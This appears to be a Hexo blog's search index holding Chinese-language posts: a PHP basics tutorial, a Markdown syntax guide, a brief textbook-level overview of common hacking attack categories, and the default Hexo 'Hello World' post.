    <content type="html"><![CDATA[<h1 id="PHP（一）"><a href="#PHP（一）" class="headerlink" title="PHP（一）"></a>PHP（一）</h1><ul><li><p>PHP（全称：PHP：Hypertext Preprocessor，即”PHP：超文本预处理器”）是一种通用开源脚本语言。</p></li><li><p>PHP 文件可包含文本、HTML、JavaScript代码和 PHP 代码</p></li><li><p>PHP 代码在服务器上执行，结果以纯 HTML 形式返回给浏览器</p></li><li><p>PHP 文件的默认文件扩展名是 “.php”</p></li><li><p><a href="#php%E4%B8%80">PHP（一）</a></p><ul><li><a href="#%E5%8F%98%E9%87%8F">变量</a><ul><li><a href="#php-%E5%8F%98%E9%87%8F%E4%BD%9C%E7%94%A8%E5%9F%9F">PHP 变量作用域</a><ul><li><a href="#global%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E4%BD%9C%E7%94%A8%E5%9F%9F"><strong>Global:全局变量作用域</strong></a></li><li><a href="#static-%E9%9D%99%E6%80%81%E4%BD%9C%E7%94%A8%E5%9F%9F"><strong>Static :静态作用域</strong></a></li><li><a href="#local%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F"><strong>local:局部变量的作用域</strong></a></li><li><a href="#parameter%E5%8F%82%E6%95%B0%E4%BD%9C%E7%94%A8%E5%9F%9F"><strong>parameter：参数作用域</strong></a></li></ul></li></ul></li><li><a href="#php-echo-%E5%92%8C-print-%E8%AF%AD%E5%8F%A5">PHP echo 和 print 语句</a></li><li><a href="#php-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">PHP  数据类型</a><ul><li><a href="#php-%E5%AD%97%E7%AC%A6%E4%B8%B2string">PHP 字符串(string)</a></li><li><a href="#php-%E5%B9%B6%E7%BD%AE%E8%BF%90%E7%AE%97%E7%AC%A6">PHP 并置运算符</a></li><li><a href="#php-%E6%95%B4%E5%9E%8Binteger">PHP 整型(Integer)</a></li><li><a href="#php-%E6%B5%AE%E7%82%B9%E5%9E%8Bfloat">PHP 浮点型（float）</a></li><li><a href="#php-%E5%B8%83%E5%B0%94%E5%9E%8B-boolean">PHP 布尔型( Boolean)</a></li><li><a href="#php-%E6%95%B0%E7%BB%84array">PHP 数组(array)</a></li><li><a href="#php-%E5%AF%B9%E8%B1%A1">PHP 对象</a></li><li><a href="#php-null-%E5%80%BC">PHP NULL 值</a></li></ul></li><li><a href="#php-%E5%B8%B8%E9%87%8F">PHP 常量</a><ul><li><a href="#%E8%AE%BE%E7%BD%AE-php-%E5%B8%B8%E9%87%8F">设置 PHP 常量</a></li><li><a href="#php-strlen-%E5%87%BD%E6%95%B0">PHP strlen() 函数</a></li><li><a href="#php-strpos-%E5%87%BD%E6%95%B0">PHP strpos() 函数</a></li></ul></li></ul></li></ul><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>变量是用于存储信息的”容器”。（php与C语言比较类似）</p><ul><li>变量以 $ 符号开始，后面跟着变量的名称</li><li><strong>变量名必须以字母或者下划线字符开始</strong></li><li>变量名只能包含字母数字字符以及下划线（A-z、0-9 和 _ ）</li><li>变量名不能包含空格</li><li>变量名和语句都是区分大小写的（$y 和 $Y 是两个不同的变量）</li><li>赋一个文本值给变量时，需在文本值两侧加上引号。</li></ul><h3 id="PHP-变量作用域"><a href="#PHP-变量作用域" class="headerlink" title="PHP 变量作用域"></a>PHP 变量作用域</h3><p>变量的作用域是脚本中变量可被引用/使用的部分。</p><h5 id="Global-全局变量作用域"><a href="#Global-全局变量作用域" class="headerlink" title="Global:全局变量作用域"></a><strong>Global:全局变量作用域</strong></h5><p>除了函数外，全局变量(即在函数外声明，无法在函数内声明的变量。同理:在函数内声明,无法在函数外声明的变量为局部变量。<strong>因此可以在不同函数中使用相同的变量名称，因为这些函数内定义的变量名是局部变量，只作用于该函数内。</strong>关于局部变量和全局变量的优先级，因为在PHP中函数都有自己单独的作用域，所以在局部变量的优先级要大于全局变量（在你不声明这个变量之前），声明之后此变量就变成了局部变量如果修改值那么全局变量的值也会改变。)可以被脚本中的任何部分访问，要在一个函数中访问一个全局变量，需要使用 global 关键字。</p><p>在源代码中，global $x,$y;    $y=$x+$y; 和 $GLOBALS[‘y’]=$GLOBALS[‘x’]+$GLOBALS[‘y’]; 是等效的。</p><h5 id="Static-静态作用域"><a href="#Static-静态作用域" class="headerlink" title="Static :静态作用域"></a><strong>Static :静态作用域</strong></h5><p>当一个函数完成时，它的所有变量通常都会被删除。但有时候您希望某个局部变量不要被删除可以在您第一次声明变量时使用 <strong>static</strong> 关键字。每次调用该函数时，该变量将会保留着函数前一次被调用时的值。</p><h5 id="local-局部变量的作用域"><a href="#local-局部变量的作用域" class="headerlink" title="local:局部变量的作用域"></a><strong>local:局部变量的作用域</strong></h5><p>在 PHP 函数内部声明的变量是局部变量，仅能在函数内部访问。</p><h5 id="parameter：参数作用域"><a href="#parameter：参数作用域" class="headerlink" title="parameter：参数作用域"></a><strong>parameter：参数作用域</strong></h5><p>参数是通过调用代码将值传递给函数的局部变量。</p><h2 id="PHP-echo-和-print-语句"><a href="#PHP-echo-和-print-语句" class="headerlink" title="PHP echo 和 print 语句"></a>PHP echo 和 print 语句</h2><ul><li>echo - 可以输出一个或多个字符串(字符串可以包含 HTML 标签)</li><li>print - 只允许输出一个字符串，返回值总为 1</li><li>echo 输出的速度比 print 快， echo 没有返回值，print有返回值1。</li></ul><h2 id="PHP-数据类型"><a href="#PHP-数据类型" class="headerlink" title="PHP  数据类型"></a>PHP  数据类型</h2><h4 id="PHP-字符串-string"><a href="#PHP-字符串-string" class="headerlink" title="PHP 字符串(string)"></a>PHP 字符串(string)</h4><p>一个字符串是一串字符的序列,可以将任何文本放在单引号和双引号中。字符串变量用于包含有字符的值。</p><h4 id="PHP-并置运算符"><a href="#PHP-并置运算符" class="headerlink" title="PHP 并置运算符"></a>PHP 并置运算符</h4><p>并置运算符 (.) 用于把两个字符串值连接起来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$txt1&#x3D;&quot;What a handsome boy!&quot;;</span><br><span class="line">$txt2&#x3D;&quot;I want to pursue him!&quot;;</span><br><span class="line">echo $txt1 . &quot; &quot; . $txt2;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>上面的代码将输出：What a handsome boy!I want to pursue him!</p><h4 id="PHP-整型-Integer"><a href="#PHP-整型-Integer" class="headerlink" title="PHP 整型(Integer)"></a>PHP 整型(Integer)</h4><ul><li>整数必须至少有一个数字 (0-9)</li><li>整数不能包含逗号或空格</li><li>整数是没有小数点的</li><li>整数可以是正数或负数</li><li>整型可以用三种格式来指定：十进制， 十六进制（ 以 0x 为前缀）或八进制（前缀为 0）.</li></ul><h4 id="PHP-浮点型（float）"><a href="#PHP-浮点型（float）" class="headerlink" title="PHP 浮点型（float）"></a>PHP 浮点型（float）</h4><p>浮点数是带小数部分的数字，或是指数形式。</p><h4 id="PHP-布尔型-Boolean"><a href="#PHP-布尔型-Boolean" class="headerlink" title="PHP 布尔型( Boolean)"></a>PHP 布尔型( Boolean)</h4><p>布尔型可以是 TRUE 或 FALSE，通常用于条件判断。</p><h4 id="PHP-数组-array"><a href="#PHP-数组-array" class="headerlink" title="PHP 数组(array)"></a>PHP 数组(array)</h4><p>数组可以在一个变量中存储多个值。</p><h4 id="PHP-对象"><a href="#PHP-对象" class="headerlink" title="PHP 对象"></a>PHP 对象</h4><p>对象数据类型也可以用于存储数据.在 PHP 中，必须使用class关键字声明类对象,类是可以包含属性和方法的结构。PHP关键字this指向当前对象实例的指针，不指向任何其他对象或类。</p><h4 id="PHP-NULL-值"><a href="#PHP-NULL-值" class="headerlink" title="PHP NULL 值"></a>PHP NULL 值</h4><p>NULL 值表示变量没有值。NULL 是数据类型为 NULL 的值。</p><p>NULL 值指明一个变量是否为空值。 同样可用于数据空值和NULL值的区别。</p><h2 id="PHP-常量"><a href="#PHP-常量" class="headerlink" title="PHP 常量"></a>PHP 常量</h2><p>常量是一个简单值的标识符。该值在脚本的其它任何地方都不能改变。一个常量由英文字母、下划线、和数字组成,但数字不能作为首字母出现。 (常量名不需要加 $ 修饰符,不然会将常量转换成新的未定义变量使用，会导致报错)。<strong>常量在定义后，默认是全局变量，可以在整个运行的脚本的任何地方使用。</strong></p><h4 id="设置-PHP-常量"><a href="#设置-PHP-常量" class="headerlink" title="设置 PHP 常量"></a>设置 PHP 常量</h4><p> define() 函数:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool define ( string $name , mixed $value [, bool $case_insensitive &#x3D; false ] )</span><br></pre></td></tr></table></figure><ul><li><strong>name：</strong>必选参数，常量名称，即标志符。</li><li><strong>value：</strong>必选参数，常量的值。</li><li><strong>case_insensitive</strong> ：可选参数，如果设置为 TRUE，该常量则大小写不敏感。默认是大小写敏感的。</li></ul><h4 id="PHP-strlen-函数"><a href="#PHP-strlen-函数" class="headerlink" title="PHP strlen() 函数"></a>PHP strlen() 函数</h4><p> 常常用在循环和其他函数中</p><p>strlen() 函数返回字符串的长度（字节数）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo strlen(&quot;功夫熊猫&quot;);   &#x2F;&#x2F; 输出 12</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出结果为 12，因为一个中文占 3 个字符数。</p><p>可以使用 mb_strlen 设置指定编码输出中文字符个数(中文下的字符在 UTF-8 下是 3 个字符长度，在 gbk 下是2个字符长度)</p><h4 id="PHP-strpos-函数"><a href="#PHP-strpos-函数" class="headerlink" title="PHP strpos() 函数"></a>PHP strpos() 函数</h4><p>strpos() 函数用于在字符串内查找一个字符或一段指定的文本。(mb_strpos 按字处理，strpos 按字符处理)</p><p>如果在字符串中找到匹配，该函数会返回第一个匹配的字符位置。如果未找到匹配，则返回 FALSE。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo strpos(&quot;what a handsome boy!&quot;,&quot;handsome&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>上面的代码将输出：7</p><p>在上面的实例中，字符串 “handsome” 的位置是 7。之所以是 7而不是 8 的原因是，字符串中第一个字符的位置是 0，而不是 1。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>markdown</title>
    <link href="/2020/10/09/markdown/"/>
    <url>/2020/10/09/markdown/</url>
    
    <content type="html"><![CDATA[<h1 id="MarkDown："><a href="#MarkDown：" class="headerlink" title="MarkDown："></a>MarkDown：</h1><ul><li><a href="#markdown">MarkDown：</a><ul><li><em><a href="#%E4%B8%80%E7%BC%96%E8%BE%91%E5%99%A8">一、编辑器</a></em></li><li><em><a href="#%E4%BA%8C%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95">二、基本用法</a></em></li><li><em><a href="#%E4%B8%89%E8%AF%AD%E6%B3%95">三、语法</a></em><ul><li><em><a href="#1%E6%A0%87%E9%A2%98">1、标题</a></em></li><li><em><a href="#2%E6%96%87%E5%AD%97%E6%A0%BC%E5%BC%8F">2、文字格式</a></em><ul><li><em><a href="#1%E7%B2%97%E4%BD%93">(1)粗体：</a></em></li><li><em><a href="#2%E6%96%9C%E4%BD%93">(2)斜体：</a></em></li><li><em><a href="#3%E7%B2%97%E6%96%9C%E4%BD%93">(3)粗斜体：</a></em></li><li><em><a href="#4%E5%88%A0%E9%99%A4">(4)删除:</a></em></li></ul></li></ul></li><li><em><a href="#3%E5%88%97%E8%A1%A8">3、列表</a></em><ul><li><em><a href="#1%E6%97%A0%E5%BA%8F%E5%88%97%E8%A1%A8">(1)无序列表：</a></em></li><li><em><a href="#2%E6%9C%89%E5%BA%8F%E5%88%97%E8%A1%A8">(2)有序列表:</a></em></li></ul></li><li><em><a href="#4%E9%93%BE%E6%8E%A5">4、链接</a></em><ul><li><em><a href="#1%E7%9B%B4%E6%8E%A5%E8%AE%BE%E7%BD%AE%E8%A1%8C%E5%86%85%E5%BD%A2%E5%BC%8F">(1)直接设置（行内形式)</a></em></li><li><em><a href="#2%E9%97%B4%E6%8E%A5%E8%AE%BE%E7%BD%AE%E5%8F%82%E8%80%83%E5%BD%A2%E5%BC%8F">(2)间接设置（参考形式）</a></em></li><li><em><a href="#3%E9%9A%90%E5%BC%8F%E8%AE%BE%E7%BD%AE">(3）隐式设置</a></em></li></ul></li><li><em><a href="#5%E5%9B%BE%E7%89%87">5、图片</a></em></li><li><em><a href="#6%E5%BC%95%E7%94%A8">6、引用</a></em></li><li><em><a href="#7%E6%B0%B4%E5%B9%B3%E5%88%86%E5%89%B2%E7%BA%BF">7、水平分割线</a></em></li><li><em><a href="#8%E8%A1%A8%E6%A0%BC">8、表格</a></em></li><li><em><a href="#9%E4%BB%A3%E7%A0%81">9、代码</a></em><ul><li><em><a href="#1%E4%BB%A3%E7%A0%81%E5%8F%A5">(1）代码句</a></em></li><li><em><a href="#2%E4%BB%A3%E7%A0%81%E6%AE%B5">(2）代码段</a></em></li><li><em><a href="#3%E7%94%A8%E4%B8%89%E4%B8%AA%E4%BB%A5%E4%B8%8A%E7%9A%84%E5%8F%8D%E5%BC%95%E5%8F%B7%E5%AE%9A%E4%B9%89%E6%AE%B5%E5%BC%80%E5%A7%8B%E5%92%8C%E7%BB%93%E6%9D%9F">(3）用三个以上的反引号定义段开始和结束</a></em></li></ul></li><li><em><a href="#10%E7%9B%AE%E5%BD%95">10、目录</a></em></li><li><em><a href="#11%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6">11、转义字符</a></em></li><li><em><a href="#12uml%E5%9B%BE">12、UML图</a></em><ul><li><em><a href="#%E6%B8%B2%E6%9F%93%E5%BA%8F%E5%88%97%E5%9B%BE">渲染序列图：</a></em></li></ul></li></ul></li></ul><h2 id="一、编辑器"><a href="#一、编辑器" class="headerlink" title="一、编辑器"></a><em>一、编辑器</em></h2><p><strong>1、MarkDown Pad2</strong></p><p><a href="http://markdownpad.com/">MarkDown Pad2</a>目前用的人多，它可以边写边预览效果，免费生成html文档，但生成pdf文档须升级成专业版。</p><p><strong>2、Typora（推荐）</strong></p><p><a href="https://www.typora.io/">Typora</a>较为便利，输入标记符号后，软件会自动对标记的文本进行渲染，生成格式。 　　</p><h2 id="二、基本用法"><a href="#二、基本用法" class="headerlink" title="二、基本用法"></a><em>二、基本用法</em></h2><p>1、单个回车=空格<br> 2、连续回车=分段<br> 3、行尾加两个空格=段内换行<br> 4、HTML的注释 </p><h2 id="三、语法"><a href="#三、语法" class="headerlink" title="三、语法"></a><em>三、语法</em></h2><h3 id="1、标题"><a href="#1、标题" class="headerlink" title="1、标题"></a>1、标题</h3><p>#号之后记得空格，共有六级标题，以此类推。</p><p><img src="/2020/10/09/markdown/%E6%A0%87%E9%A2%98.jpg" alt="标题"></p><h3 id="2、文字格式"><a href="#2、文字格式" class="headerlink" title="2、文字格式"></a>2、文字格式</h3><h4 id="1-粗体："><a href="#1-粗体：" class="headerlink" title="(1)粗体："></a>(1)粗体：</h4><p>将需要设置为斜体的文字两端使用2个“*”或者“_”夹起来</p><p><img src="/2020/10/09/markdown/%E6%96%9C%E4%BD%93.jpg" alt="斜体"></p><h4 id="2-斜体："><a href="#2-斜体：" class="headerlink" title="(2)斜体："></a>(2)斜体：</h4><p>将需要设置为斜体的文字两端使用1个“*”或者“_”夹起来</p><p><img src="/2020/10/09/markdown/%E6%96%9C.jpg" alt="斜"></p><h4 id="3-粗斜体："><a href="#3-粗斜体：" class="headerlink" title="(3)粗斜体："></a>(3)粗斜体：</h4><p>将需要设置为斜体的文字两端使用3个“*”或者“_”夹起来</p><p><img src="/2020/10/09/markdown/%E7%B2%97%E6%96%9C.jpg" alt="粗斜"></p><h4 id="4-删除"><a href="#4-删除" class="headerlink" title="(4)删除:"></a>(4)删除:</h4><p>使用2个~号即可。</p><p><img src="/2020/10/09/markdown/%E5%88%A0.jpg" alt="删"></p><h2 id="3、列表"><a href="#3、列表" class="headerlink" title="3、列表"></a>3、列表</h2><h3 id="1-无序列表："><a href="#1-无序列表：" class="headerlink" title="(1)无序列表："></a>(1)无序列表：</h3><p>在文字开头添加(*,+,-)实现无序列表。但是要注意在符号和文字之间需要添加空格。</p><p> 嵌套:上一级和下一级之间需要三个空格或tab键</p><p><img src="/2020/10/09/markdown/%E5%B5%8C%E5%A5%97.jpg" alt="嵌套"></p><h3 id="2-有序列表"><a href="#2-有序列表" class="headerlink" title="(2)有序列表:"></a>(2)有序列表:</h3><p>使用数字后面跟上句号,还要有空格。</p><p><img src="/2020/10/09/markdown/%E5%88%97%E8%A1%A8.jpg" alt="列表"></p><h2 id="4、链接"><a href="#4、链接" class="headerlink" title="4、链接"></a>4、链接</h2><h3 id="1-直接设置（行内形式"><a href="#1-直接设置（行内形式" class="headerlink" title="(1)直接设置（行内形式)"></a>(1)直接设置（行内形式)</h3><p>语法：<a href="%E9%93%BE%E6%8E%A5%E5%9C%B0%E5%9D%80" title="链接title">链接名</a></p><h3 id="2-间接设置（参考形式）"><a href="#2-间接设置（参考形式）" class="headerlink" title="(2)间接设置（参考形式）"></a>(2)间接设置（参考形式）</h3><p> <strong>语法：[链接名称][标记]</strong><br>[标记]: 链接地址 “链接title”</p><h3 id="3）隐式设置"><a href="#3）隐式设置" class="headerlink" title="(3）隐式设置"></a>(3）隐式设置</h3><p><strong>语法：[链接名称][]</strong><br>[链接名称]: 链接地址 “链接title”</p><h2 id="5、图片"><a href="#5、图片" class="headerlink" title="5、图片"></a>5、图片</h2><p>直接复制一个图片路径到编辑器，然后前面加上感叹号！即可</p><h2 id="6、引用"><a href="#6、引用" class="headerlink" title="6、引用"></a>6、引用</h2><p>（1）引用换行：末尾加两个空格。</p><p>  (2）引用内包含其他语法：</p><p> <strong>如：</strong>标题、列表、代码块 <strong>一定要写在引开头处</strong></p><p><img src="/2020/10/09/markdown/%E5%BC%95.jpg" alt="引"></p><h2 id="7、水平分割线"><a href="#7、水平分割线" class="headerlink" title="7、水平分割线"></a>7、水平分割线</h2><p>用3个连续的*或_或-即可</p><h2 id="8、表格"><a href="#8、表格" class="headerlink" title="8、表格"></a>8、表格</h2><p>关于冒号（:）</p><p><strong>左边：</strong>以下内容左对齐 </p><p><strong>右边：</strong>以下内容右对齐 </p><p> <strong>两边：</strong>以下内容居中对齐</p><p><img src="/2020/10/09/markdown/%E8%A1%A8%E6%A0%BC.jpg" alt="表格"></p><h2 id="9、代码"><a href="#9、代码" class="headerlink" title="9、代码"></a>9、代码</h2><h3 id="1）代码句"><a href="#1）代码句" class="headerlink" title="(1）代码句"></a>(1）代码句</h3><p>用反引号（`），就是英文状态下的波浪线。</p><h3 id="2）代码段"><a href="#2）代码段" class="headerlink" title="(2）代码段"></a>(2）代码段</h3><p>4个空格（或Tab缩进）定义代码块。</p><h3 id="3）用三个以上的反引号定义段开始和结束"><a href="#3）用三个以上的反引号定义段开始和结束" class="headerlink" title="(3）用三个以上的反引号定义段开始和结束"></a>(3）用三个以上的反引号定义段开始和结束</h3><h2 id="10、目录"><a href="#10、目录" class="headerlink" title="10、目录"></a>10、目录</h2><p>在想加目录的地方输入[TOC]</p><h2 id="11、转义字符"><a href="#11、转义字符" class="headerlink" title="11、转义字符"></a>11、转义字符</h2><p><img src="/2020/10/09/markdown/%E5%AD%97%E7%AC%A6.jpg" alt="字符"></p><h2 id="12、UML图"><a href="#12、UML图" class="headerlink" title="12、UML图"></a>12、UML图</h2><h3 id="渲染序列图："><a href="#渲染序列图：" class="headerlink" title="渲染序列图："></a>渲染序列图：</h3><p><img src="/2020/10/09/markdown/%E5%93%88.jpg" alt="哈"></p><p>效果如下:</p><p><img src="/2020/10/09/markdown/%E5%95%A6.jpg" alt="啦"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Cyber security tour</title>
    <link href="/2020/10/05/Cyber/"/>
    <url>/2020/10/05/Cyber/</url>
    
    <content type="html"><![CDATA[<p>黑客(Hacher）</p><p><img src="/2020/10/05/Cyber/%E9%BB%91%E5%AE%A2.jpg" alt="黑客"></p><p>源于英语动词 hack，意为“劈，砍”。黑客主要利用计算机系统或网络的漏洞，包括软件漏洞、硬件漏洞、网络协议漏洞、管理方面的漏洞喝一些人为的错误，通过现有的或自己开发的工具软件实施攻击。黑客攻击手段主要包括：<br>（1）探测攻击。通过少票允许连接的服务和开放的端口，能够迅速发现目标主机端口的分配情况以及提供的各项服务和服务程序的版本号，黑客找到有机可乘的服务或端口后进行攻击。常见的探测攻击程序有：SATAN、Saint、NTscan、Nessus等。<br>(2)网络监听。将网卡设置为混杂模式，对以太网上流通的所有数据包进行监听，并将符合一定条件的数据包记录到文件中去，以获取敏感信息。常见的网络监听工具有：NetRay、Sniffit、Sniffer、Etherfind、Snoop等。<br>（3)解码类攻击。通过各种方法获取 password文件，然后用口令猜测程序破译用户账号和密码。常见的工具有：Crack、LOphtCrack、John the Ripper等。<br>(4)未授权访问尝试。利用系统管理策略或配置文件的漏洞，获得比合法权限更高的操作权。如：NFS猜测、NFS UID检查等。<br>(5)缓冲区溢出。通过往程序的缓冲区写超出其长度的内容，造成缓冲区的溢出，从而破坏程<br>序的堆栈，使程序转而执行其他的指令，如果这些指令是放在root 权限的内存中，那么一旦这些<br>指令得到了运行，黑客就以root 权限控制了系统，达到入侵的目的。缓冲区攻击的目的在于扰乱<br>某些以特权身份运行的程序的功能。使攻击者获得程序的控制权。<br>（6)伪装攻击，通过指定路由或伪造家地址，以假冒身份于其他主机进行合法通讯、或发送假<br>数据包，使受攻击主机出现错误动作。如IP欺骗。<br>(7)电子欺骗攻击。黑客利用TCP/TP协议本身的一些缺陷对TCP/IP网络进行攻击，主要方式<br>有：ARP欺骗、DNS欺骗、Web 欺骗、电子邮件欺骗等，</p><p>(8)WWW攻击。利用WEB的不合理配置，或CGI程序的漏洞进行攻击，达到获取脚本源码，非法<br>执行程序，使WWW服务器崩溃等目的。如：Windouws NT的IIS服务器的多种攻击。<br>(9)拒绝服务和分布式拒绝服务攻击。这种攻击行为通过发送一定数量一定序列的数据包，是<br>网络服务器中充斥了大量要求回复的信息，消耗网络带宽或系统资源，导致网络或系统不胜负荷以<br>至瘫痪、停止正常的网络服务。<br>（10)病毒攻击。病毒是黑客实施网络攻击的有效手段之一，它具有隐蔽性、寄生性、繁殖性和<br>破坏性，而且在网络中更加可怕。目前可通过网络进行传播的病毒已有数千中。<br>为了对这些影响网络安全的威胁进行有效防范，我们必须采用有效的技术手段。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2020/10/04/hello-world/"/>
    <url>/2020/10/04/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
